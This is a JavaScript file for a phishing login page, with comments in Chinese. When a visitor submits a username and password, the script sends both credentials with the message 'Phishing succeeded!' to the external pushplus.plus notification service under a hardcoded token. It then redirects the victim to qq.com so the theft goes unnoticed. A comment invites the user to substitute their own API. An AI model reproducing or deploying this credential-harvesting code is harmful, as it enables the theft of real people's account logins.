
(function () {
    const login = document.querySelector('#login')
    function sendMsg() {
        const userName = document.querySelector('#name').value;
        const passWord = document.querySelector('#password').value;

        const uname = document.querySelector('#uname')
        const upwd = document.querySelector('#upwd')
        const all = document.querySelector('#all')

        if (userName == '' && passWord !== '') {
            uname.classList.add('show')
            setTimeout(() => {
                uname.classList.remove('show')
            }, 1000)
        } else if (passWord == '' && userName !== '') {
            upwd.classList.add('show')
            setTimeout(() => {
                upwd.classList.remove('show')
            }, 1000)
        } else if (passWord == '' && userName == '') {
            all.classList.add('show')
            setTimeout(() => {
                all.classList.remove('show')
            }, 1000)
        } else {
            uname.classList.remove('show')
            uname.classList.remove('show')
            all.classList.remove('show')
            //let data = {
            //    text: "鱼上钩了",//text 固定必填且字段为 text
            //    desp: `账号：${userName}，密码：${passWord}`
            //}
            let data = "钓鱼成功！"+`账号：${userName}，密码：${passWord}`

            // 这里修改成自己的api
            let url = 'https://www.pushplus.plus/send?token=833bb521ea654abab17470a390e6f761&content=' + data

            fetch(url, {
                method: 'GET',
                //headers: {
                //    'Content-Type': 'application/json;charset=utf-8',
                //},
                //body: JSON.stringify(data),

            }).then(response => response.json())
                .then(data => {
                    setTimeout(() => {
                        window.location.href = 'https://www.qq.com/'
                    }, 1000)
                })
                .catch((error) => {
                    window.location.reload()
                });

        }


    }

    login.addEventListener('click', function () {
        sendMsg()
        console.log('daf')
    })

})();
